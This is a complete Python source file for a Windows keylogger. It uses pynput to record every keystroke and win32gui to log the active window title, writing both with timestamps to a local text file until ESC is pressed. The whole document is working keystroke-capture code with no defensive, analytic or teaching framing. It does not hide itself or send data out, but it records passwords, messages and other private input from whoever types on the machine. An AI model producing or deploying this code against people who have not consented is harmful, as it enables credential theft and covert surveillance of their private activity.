import os
import time
from pynput import keyboard
import win32gui
from datetime import datetime

LOG_FILE = "realtime_keylog.txt"

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def write_log(message):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(message)

class RealTimeKeyLogger:
    def __init__(self):
        self.current_window = None

    def on_press(self, key):
        window = get_active_window_title()

        if window != self.current_window:
            self.current_window = window
            header = f"\n\n[Window: {window} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n"
            write_log(header)

        try:
            if key.char:
                write_log(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                write_log(" ")
            elif key == keyboard.Key.enter:
                write_log("\n")
            else:
                write_log(f"[{key.name}]")

    def start(self):
        print("[✓] Real-time Keylogger started. Press ESC to stop.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.stop_listener) as listener:
            listener.join()

    def stop_listener(self, key):
        if key == keyboard.Key.esc:
            print("\n[✓] Logging stopped.")
            return False

if __name__ == "__main__":
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)  # Clear previous logs
    logger = RealTimeKeyLogger()
    logger.start()
